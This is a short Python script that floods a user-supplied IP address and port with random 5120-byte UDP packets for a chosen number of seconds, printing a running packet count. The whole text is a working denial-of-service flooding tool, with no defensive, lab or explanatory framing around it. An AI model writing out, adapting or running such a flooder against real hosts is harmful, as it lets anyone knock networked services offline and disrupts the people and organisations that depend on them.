import sys,random,time,socket

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

bytes = random._urandom(5120)
ip = input("Target IP:")
port = int(input("Port:"))
dur = float(input("Number of seconds to send packet:"))
timeout = time.time() + dur
sent = 0

while 1:
	if time.time() > timeout:
		break
	sock.sendto(bytes,(ip,port))
	sent += 1
	print("Sent %s packet to %s througt port %s"%(sent,ip,port)) 